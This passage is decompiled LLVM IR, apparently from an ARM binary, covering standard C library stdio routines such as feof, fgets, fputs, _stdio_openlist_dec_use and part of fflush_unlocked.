  br i1 %v6_c17c, label %dec_label_pc_c0d8, label %dec_label_pc_c19c

dec_label_pc_c184:                                ; preds = %dec_label_pc_c0cc
  %v0_c184 = load i32, i32* %r7.global-to-local, align 4
  %v1_c184 = add i32 %v0_c184, 28
  %v2_c184 = inttoptr i32 %v1_c184 to i32*
  %v3_c184 = load i32, i32* %v2_c184, align 4
  store i32 %v3_c184, i32* %r2.global-to-local, align 4
  %v0_c188 = load i32, i32* %r0.global-to-local, align 4
  %v1_c188 = trunc i32 %v0_c188 to i8
  %v3_c188 = add i32 %v0_c184, 38
  %v4_c188 = inttoptr i32 %v3_c188 to i8*
  store i8 %v1_c188, i8* %v4_c188, align 1
  %v0_c18c = load i32, i32* %r2.global-to-local, align 4
  %v3_c18c = mul i32 %v0_c18c, 4
  store i32 %v3_c18c, i32* @r2, align 4
  %v0_c190 = load i32, i32* %r7.global-to-local, align 4
  %v1_c190 = add i32 %v0_c190, 40
  store i32 %v1_c190, i32* @r0, align 4
  %v2_c194 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_c194, i32* @r1, align 4
  %v0_c198 = call i32 @memcpy()
  store i32 %v0_c198, i32* %r0.global-to-local, align 4
  %v0_c19c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c16c, %dec_label_pc_c184
  %v2_c1b8 = phi i32 [ %v0_c19c.pre, %dec_label_pc_c184 ], [ %v0_c16c, %dec_label_pc_c16c ]
  %v1_c19c = add i32 %v2_c1b8, 16
  %v2_c19c = inttoptr i32 %v1_c19c to i32*
  %v3_c19c = load i32, i32* %v2_c19c, align 4
  store i32 %v3_c19c, i32* %r3.global-to-local, align 4
  %v1_c1a0 = and i32 %v3_c19c, 128
  %v2_c1a0 = icmp eq i32 %v1_c1a0, 0
  br i1 %v2_c1a0, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_c19c
  store i32 %v2_bd44, i32* %r3.global-to-local, align 4
  %v2_c1a8 = inttoptr i32 %v2_c1b8 to i32*
  %v3_c1a8 = load i32, i32* %v2_c1a8, align 4
  %v2_c1b0.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_c1b0 = sub i32 %v2_c1b0.pre, %v2_bd44
  store i32 %v3_c1b0, i32* %r3.global-to-local, align 4
  %v5_c1b4 = mul i32 %v3_c1b0, 4
  %v6_c1b4 = add i32 %v5_c1b4, %v3_c1a8
  store i32 %v6_c1b4, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_c19c
  %v1_c1ac41 = load i32, i32* %r6.global-to-local, align 4
  %v2_c1ac42 = add i32 %v1_c1ac41, 1
  store i32 %v2_c1ac42, i32* %r3.global-to-local, align 4
  %v3_c1b8 = inttoptr i32 %v2_c1b8 to i32*
  store i32 %v2_c1ac42, i32* %v3_c1b8, align 4
  %v0_c1bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_c1c4 = phi i32 [ %v2_c1b8, %.thread44 ], [ %v0_c1bc.pre, %.thread46 ]
  %v1_c1bc = add i32 %v1_c1c4, 28
  %v2_c1bc = inttoptr i32 %v1_c1bc to i32*
  %v3_c1bc = load i32, i32* %v2_c1bc, align 4
  store i32 %v3_c1bc, i32* %r3.global-to-local, align 4
  %v1_c1c0 = add i32 %v3_c1bc, 2
  store i32 %v1_c1c0, i32* %r0.global-to-local, align 4
  %v0_c1c4 = load i32, i32* %sb.global-to-local, align 4
  %v2_c1c4 = add i32 %v1_c1c4, 24
  %v3_c1c4 = inttoptr i32 %v2_c1c4 to i32*
  store i32 %v0_c1c4, i32* %v3_c1c4, align 4
  br i1 %v2_c1a0, label %dec_label_pc_c1d4, label %bb147

bb147:                                            ; preds = %bb146
  %v1_c1c8 = load i32, i32* @r2, align 4
  %v2_c1c8 = load i32, i32* %r7.global-to-local, align 4
  %v3_c1c8 = inttoptr i32 %v2_c1c8 to i32*
  store i32 %v1_c1c8, i32* %v3_c1c8, align 4
  br label %dec_label_pc_c1d4

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_bd8c, %dec_label_pc_be98, %dec_label_pc_bf48, %dec_label_pc_bf1c, %dec_label_pc_bf28, %dec_label_pc_be68, %dec_label_pc_c108, %dec_label_pc_c0b4, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1d4

dec_label_pc_c1d4:                                ; preds = %bb147, %bb146, %dec_label_pc_c1d0
  %v2_c1d8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_c1d8, i32* @r4, align 4
  store i32 %v6_bd3c, i32* @r5, align 4
  %v26_c1d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_c1d8

; uselistorder directives
  uselistorder i32 %v3_c1b0, { 1, 0 }
  uselistorder i32 %v1_c170, { 1, 2, 0 }
  uselistorder i32 %v0_c124, { 1, 2, 0 }
  uselistorder i32 %v2_c100, { 1, 0 }
  uselistorder i32 %v1_c100, { 1, 0, 2 }
  uselistorder i32 %v0_c120, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_c064, { 1, 2, 0 }
  uselistorder i32 %v3_c04c, { 1, 0 }
  uselistorder i32 %v3_c044, { 1, 0 }
  uselistorder i32 %v2_c024, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_c00c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_bff0, { 1, 0, 2 }
  uselistorder i32 %v3_bfd0, { 2, 1, 0 }
  uselistorder i32 %v1_bf94, { 0, 2, 3, 1 }
  uselistorder i32 %v2_bf68, { 1, 0 }
  uselistorder i32 %v5_bec8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bec8, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_be74, { 1, 0 }
  uselistorder i32 %v0_be90, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_be58, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_be40, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_be2c, { 1, 2, 0 }
  uselistorder i32 %v0_bea4, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_bde0, { 1, 0 }
  uselistorder i32 %v1_bdb0, { 0, 2, 1 }
  uselistorder i32 %v25_bd3c, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 4, 1, 3, 5, 9, 6, 2, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18 }
  uselistorder i32* %r6.global-to-local, { 9, 11, 13, 12, 3, 5, 14, 6, 7, 8, 0, 1, 2, 15, 4, 10 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 1, 26, 27, 28, 21, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1374c.476 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1375c.474 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_13778.468 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_13738.466 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_c1d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c1d0, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c16c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c158, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c114, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bf80, { 1, 0 }
  uselistorder label %dec_label_pc_bf58, { 1, 0 }
  uselistorder label %dec_label_pc_bf08, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_be88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_be84, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bde4, { 1, 0 }
  uselistorder label %dec_label_pc_bdd4, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c200 = load i32, i32* @r4, align 4
  store i32 %v3_c200, i32* %stack_var_-16, align 4
  %v2_c204 = add i32 %tmp, 52
  %v3_c204 = inttoptr i32 %v2_c204 to i32*
  %v4_c204 = load i32, i32* %v3_c204, align 4
  store i32 %v4_c204, i32* %r6.global-to-local, align 4
  %v2_c20c = ptrtoint i32* %stack_var_-32 to i32
  %v2_c210 = icmp eq i32 %v4_c204, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_c20c, i32* @r0, align 4
  br i1 %v2_c210, label %dec_label_pc_c228, label %dec_label_pc_c244

dec_label_pc_c228:                                ; preds = %entry
  %v1_c230 = call i32 @__pthread_return_void()
  %v1_c240 = call i32 @__pthread_return_0()
  %v0_c244.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_c24c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c244

dec_label_pc_c244:                                ; preds = %entry, %dec_label_pc_c228
  %v0_c24c = phi i32 [ %v4_c204, %entry ], [ %v0_c24c.pre, %dec_label_pc_c228 ]
  %v0_c244 = phi i32 [ %tmp, %entry ], [ %v0_c244.pre, %dec_label_pc_c228 ]
  %v1_c244 = add i32 %v0_c244, 1
  %v2_c244 = inttoptr i32 %v1_c244 to i8*
  %v3_c244 = load i8, i8* %v2_c244, align 1
  %v4_c244 = zext i8 %v3_c244 to i32
  %v1_c248 = inttoptr i32 %v0_c244 to i8*
  %v2_c248 = load i8, i8* %v1_c248, align 1
  %v3_c248 = zext i8 %v2_c248 to i32
  %v2_c24c = icmp eq i32 %v0_c24c, 0
  %v4_c258 = mul nuw nsw i32 %v4_c244, 256
  %v5_c258 = or i32 %v3_c248, %v4_c258
  store i32 %v5_c258, i32* %r4.global-to-local, align 4
  br i1 %v2_c24c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c244
  call void @__pseudo_branch(i32 58724)
  %v0_c268.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c244, %bb
  %v0_c268 = phi i32 [ %v5_c258, %dec_label_pc_c244 ], [ %v0_c268.pre, %bb ]
  %v1_c268 = and i32 %v0_c268, 4
  %v2_c270 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c270, i32* @r4, align 4
  ret i32 %v1_c268

; uselistorder directives
  uselistorder i32 %v0_c244, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c244, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_c284 = load i32, i32* @r4, align 4
  store i32 %v3_c284, i32* %stack_var_-24, align 4
  %v6_c284 = load i32, i32* @r5, align 4
  %v9_c284 = load i32, i32* @r6, align 4
  %v12_c284 = load i32, i32* @r7, align 4
  %v1_c288 = add i32 %arg3, 52
  %v2_c288 = inttoptr i32 %v1_c288 to i32*
  %v3_c288 = load i32, i32* %v2_c288, align 4
  store i32 %v3_c288, i32* %r8.global-to-local, align 4
  %v2_c28c = ptrtoint i32* %stack_var_-40 to i32
  %v1_c290 = add i32 %arg3, 56
  store i32 %v1_c290, i32* @r5, align 4
  %v2_c294 = icmp eq i32 %v3_c288, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_c28c, i32* @r0, align 4
  br i1 %v2_c294, label %dec_label_pc_c2b4, label %dec_label_pc_c2d0

dec_label_pc_c2b4:                                ; preds = %entry
  %v1_c2bc = call i32 @__pthread_return_void()
  store i32 49872, i32* @lr, align 4
  %v1_c2cc = call i32 @__pthread_return_0()
  %v0_c2d0.pre = load i32, i32* @r6, align 4
  %v0_c2d4.pre = load i32, i32* @r4, align 4
  %v0_c2d8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c2d0

dec_label_pc_c2d0:                                ; preds = %entry, %dec_label_pc_c2b4
  %v0_c2d8 = phi i32 [ %arg1, %entry ], [ %v0_c2d8.pre, %dec_label_pc_c2b4 ]
  %v0_c2d4 = phi i32 [ %arg3, %entry ], [ %v0_c2d4.pre, %dec_label_pc_c2b4 ]
  %v0_c2d0 = phi i32 [ %arg2, %entry ], [ %v0_c2d0.pre, %dec_label_pc_c2b4 ]
  %v3_c2dc = inttoptr i32 %v0_c2d8 to i8*
  %v4_c2dc = call i32 @__GI_fgets_unlocked(i8* %v3_c2dc, i32 %v0_c2d0, i32 %v0_c2d4)
  %v0_c2e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_c2e0 = icmp eq i32 %v0_c2e0, 0
  store i32 %v4_c2dc, i32* %r4.global-to-local, align 4
  br i1 %v2_c2e0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c2d0
  store i32 49916, i32* @lr, align 4
  call void @__pseudo_branch(i32 58724)
  %v0_c2fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c2d0, %bb
  %v0_c2fc = phi i32 [ %v4_c2dc, %dec_label_pc_c2d0 ], [ %v0_c2fc.pre, %bb ]
  %v2_c304 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_c304, i32* @r4, align 4
  store i32 %v6_c284, i32* @r5, align 4
  store i32 %v9_c284, i32* @r6, align 4
  store i32 %v12_c284, i32* @r7, align 4
  ret i32 %v0_c2fc

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c2d0, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c318 = load i32, i32* @r4, align 4
  store i32 %v3_c318, i32* %stack_var_-20, align 4
  %v6_c318 = load i32, i32* @r5, align 4
  %v9_c318 = load i32, i32* @r6, align 4
  %v12_c318 = load i32, i32* @r7, align 4
  %v1_c31c = add i32 %arg2, 52
  %v2_c31c = inttoptr i32 %v1_c31c to i32*
  %v3_c31c = load i32, i32* %v2_c31c, align 4
  store i32 %v3_c31c, i32* @r7, align 4
  %v1_c320 = add i32 %arg2, 56
  store i32 %v1_c320, i32* @r5, align 4
  %v2_c324 = ptrtoint i32* %stack_var_-36 to i32
  %v2_c328 = icmp eq i32 %v3_c31c, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_c324, i32* @r0, align 4
  br i1 %v2_c328, label %dec_label_pc_c344, label %dec_label_pc_c360

dec_label_pc_c344:                                ; preds = %entry
  %v1_c34c = call i32 @__pthread_return_void()
  store i32 50016, i32* @lr, align 4
  %v1_c35c = call i32 @__pthread_return_0()
  %v0_c360.pre = load i32, i32* @r4, align 4
  %v0_c364.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c360

dec_label_pc_c360:                                ; preds = %entry, %dec_label_pc_c344
  %v0_c364 = phi i32 [ %arg1, %entry ], [ %v0_c364.pre, %dec_label_pc_c344 ]
  %v0_c360 = phi i32 [ %arg2, %entry ], [ %v0_c360.pre, %dec_label_pc_c344 ]
  %v2_c368 = inttoptr i32 %v0_c364 to i8*
  %v3_c368 = call i32 @__GI_fputs_unlocked(i8* %v2_c368, i32 %v0_c360)
  %v0_c36c = load i32, i32* @r7, align 4
  %v2_c36c = icmp eq i32 %v0_c36c, 0
  store i32 %v3_c368, i32* %r4.global-to-local, align 4
  br i1 %v2_c36c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c360
  call void @__pseudo_branch(i32 58724)
  %v0_c388.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c360, %bb
  %v0_c388 = phi i32 [ %v3_c368, %dec_label_pc_c360 ], [ %v0_c388.pre, %bb ]
  %v2_c390 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c390, i32* @r4, align 4
  store i32 %v6_c318, i32* @r5, align 4
  store i32 %v9_c318, i32* @r6, align 4
  store i32 %v12_c318, i32* @r7, align 4
  ret i32 %v0_c388

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c360, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_c3a8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_c3ac = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_c3ac, i32* @r0, align 4
  store i32 58724, i32* %r4.global-to-local, align 4
  %v1_c3c0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r5.global-to-local, align 4
  %v1_c3d0 = call i32 @__pthread_return_0()
  %v2_c3d8 = load i32, i32* @global_var_1dc04.410, align 4
  %v7_c3dc = icmp eq i32 %v2_c3d8, 1
  br i1 %v7_c3dc, label %dec_label_pc_c3e4, label %dec_label_pc_c490

dec_label_pc_c3e4:                                ; preds = %entry
  %v2_c3e8 = load i32, i32* @global_var_1dc08.415, align 4
  %tmp19 = icmp slt i32 %v2_c3e8, 1
  br i1 %tmp19, label %dec_label_pc_c490, label %dec_label_pc_c3f4

dec_label_pc_c3f4:                                ; preds = %dec_label_pc_c3e4
  store i32 %v2_c3a8, i32* @r0, align 4
  %v1_c404 = call i32 @__pthread_return_void()
  %v1_c410 = call i32 @__pthread_return_0()
  %v2_c418 = load i32, i32* bitcast (i32** @global_var_1d488.430 to i32*), align 4
  store i32 %v2_c418, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_c4683 = icmp eq i32 %v2_c418, 0
  br i1 %v2_c4683, label %dec_label_pc_c474, label %dec_label_pc_c424

dec_label_pc_c424:                                ; preds = %dec_label_pc_c3f4, %dec_label_pc_c464
  %v1_c43c = phi i32 [ %v0_c464, %dec_label_pc_c464 ], [ %v2_c418, %dec_label_pc_c3f4 ]
  %v1_c424 = inttoptr i32 %v1_c43c to i8*
  %v2_c424 = load i8, i8* %v1_c424, align 1
  %v3_c424 = zext i8 %v2_c424 to i32
  %v1_c428 = add i32 %v1_c43c, 1
  %v2_c428 = inttoptr i32 %v1_c428 to i8*
  %v3_c428 = load i8, i8* %v2_c428, align 1
  %v4_c428 = zext i8 %v3_c428 to i32
  %v4_c42c = mul nuw nsw i32 %v4_c428, 256
  %v5_c42c = or i32 %v4_c42c, %v3_c424
  %v2_c430 = and i32 %v5_c42c, 32816
  %v7_c434 = icmp eq i32 %v2_c430, 48
  %v1_c438 = add i32 %v1_c43c, 32
  %v2_c438 = inttoptr i32 %v1_c438 to i32*
  %v3_c438 = load i32, i32* %v2_c438, align 4
  store i32 %v3_c438, i32* %r5.global-to-local, align 4
  br i1 %v7_c434, label %dec_label_pc_c444, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_c424
  store i32 %v1_c43c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c464

dec_label_pc_c444:                                ; preds = %dec_label_pc_c424
  %v0_c444 = load i32, i32* %r6.global-to-local, align 4
  %v2_c444 = icmp eq i32 %v0_c444, 0
  br i1 %v2_c444, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_c444
  %v3_c44c = add i32 %v0_c444, 32
  %v4_c44c = inttoptr i32 %v3_c44c to i32*
  store i32 %v3_c438, i32* %v4_c44c, align 4
  %v0_c454.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_c444
  store i32 %v3_c438, i32* bitcast (i32** @global_var_1d488.430 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_c454 = phi i32 [ %v0_c454.pre, %.thread ], [ %v1_c43c, %.thread1 ]
  %v1_c454 = add i32 %v0_c454, 1
  %v2_c454 = inttoptr i32 %v1_c454 to i8*
  %v3_c454 = load i8, i8* %v2_c454, align 1
  %v1_c458 = and i8 %v3_c454, 32
  %v1_c460 = icmp ne i8 %v1_c458, 0
  call void @__pseudo_cond_branch(i1 %v1_c460, i32 ptrtoint (i32* @global_var_d4a4.412 to i32))
  %v0_c464.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_c464

dec_label_pc_c464:                                ; preds = %.thread12, %bb
  %v0_c464 = phi i32 [ %v0_c464.pre, %bb ], [ %v3_c438, %.thread12 ]
  store i32 %v0_c464, i32* %r4.global-to-local, align 4
  %v2_c468 = icmp eq i32 %v0_c464, 0
  br i1 %v2_c468, label %dec_label_pc_c474, label %dec_label_pc_c424

dec_label_pc_c474:                                ; preds = %dec_label_pc_c464, %dec_label_pc_c3f4
  store i32 %v2_c3a8, i32* @r0, align 4
  %v1_c484 = call i32 @__pthread_return_void()
  %v0_c48c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c48c, i32* @global_var_1dc08.415, align 4
  %v2_c494.pre = load i32, i32* @global_var_1dc04.410, align 4
  br label %dec_label_pc_c490

dec_label_pc_c490:                                ; preds = %entry, %dec_label_pc_c3e4, %dec_label_pc_c474
  %v2_c494 = phi i32 [ %v2_c3d8, %entry ], [ 1, %dec_label_pc_c3e4 ], [ %v2_c494.pre, %dec_label_pc_c474 ]
  %v1_c498 = add i32 %v2_c494, -1
  store i32 %v1_c498, i32* @global_var_1dc04.410, align 4
  store i32 %v2_c3ac, i32* @r0, align 4
  store i32 50356, i32* @lr, align 4
  %v1_c4b0 = call i32 @__pthread_return_void()
  ret i32 %v1_c4b0

; uselistorder directives
  uselistorder i32 %v0_c464, { 2, 1, 0 }
  uselistorder i32 %v3_c438, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c43c, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* @global_var_1dc08.415, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_c490, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c464, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_c424, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c4e4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_1d488.430 to i32), i32* %r3.global-to-local, align 4
  %v10_c4ec = icmp eq i8* %arg1, bitcast (i32** @global_var_1d488.430 to i8*)
  store i1 %v10_c4ec, i1* %cpsr_z.global-to-local, align 1
  %.v1_c4f0 = select i1 %v10_c4ec, i32 0, i32 %tmp
  store i32 %.v1_c4f0, i32* %r8.global-to-local, align 4
  %v2_c4f8 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_c4ec, label %bb, label %dec_label_pc_c504

bb:                                               ; preds = %entry
  store i32 %.v1_c4f0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_c510

dec_label_pc_c504:                                ; preds = %entry
  %v2_c504 = icmp eq i32 %.v1_c4f0, 0
  store i1 %v2_c504, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_c504, label %dec_label_pc_c510, label %dec_label_pc_c65c

dec_label_pc_c510:                                ; preds = %bb, %dec_label_pc_c504
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  %v1_c524 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1d4a4.408 to i32), i32* %r0.global-to-local, align 4
  %v1_c534 = call i32 @__pthread_return_0()
  %v2_c53c = load i32, i32* @global_var_1dc04.410, align 4
  %v1_c540 = add i32 %v2_c53c, 1
  store i32 %v1_c540, i32* %r3.global-to-local, align 4
  store i32 %v1_c540, i32* @global_var_1dc04.410, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  %v1_c558 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  %v1_c56c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1d48c.427 to i32), i32* %r0.global-to-local, align 4
  %v1_c578 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1d488.430 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c588 = load i32, i32* bitcast (i32** @global_var_1d488.430 to i32*), align 4
  store i32 %v2_c588, i32* @r6, align 4
  %v1_c590 = call i32 @__pthread_return_void()
  store i32 %v1_c590, i32* %r0.global-to-local, align 4
  store i32 %v2_c4f8, i32* @r4, align 4
  %v0_c598 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_c598, i32* @r5, align 4
  %v0_c64c.pr = load i32, i32* @r6, align 4
  %v2_c64c25 = icmp eq i32 %v0_c64c.pr, 0
  store i1 %v2_c64c25, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c64c25, label %dec_label_pc_c654, label %dec_label_pc_c5a0

dec_label_pc_c5a0:                                ; preds = %dec_label_pc_c510, %.thread11
  %v0_c5bc = phi i32 [ %v3_c648, %.thread11 ], [ %v0_c64c.pr, %dec_label_pc_c510 ]
  %v1_c5a0 = inttoptr i32 %v0_c5bc to i8*
  %v2_c5a0 = load i8, i8* %v1_c5a0, align 1
  %v3_c5a0 = zext i8 %v2_c5a0 to i32
  store i32 %v3_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = and i32 %v3_c5a0, 64
  %v2_c5a4 = icmp eq i32 %v1_c5a4, 0
  store i1 %v2_c5a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c5a4, label %.thread11, label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c5a0
  %v2_c5b0 = load i32, i32* @global_var_1d4bc.421, align 4
  store i32 %v2_c5b0, i32* %r3.global-to-local, align 4
  %v7_c5b4 = icmp eq i32 %v2_c5b0, 2
  store i1 %v7_c5b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c5b4, label %dec_label_pc_c5e8, label %dec_label_pc_c5bc

dec_label_pc_c5bc:                                ; preds = %dec_label_pc_c5ac
  %v1_c5bc = add i32 %v0_c5bc, 56
  store i32 %v1_c5bc, i32* @r4, align 4
  store i32 %v2_c4f8, i32* @r0, align 4
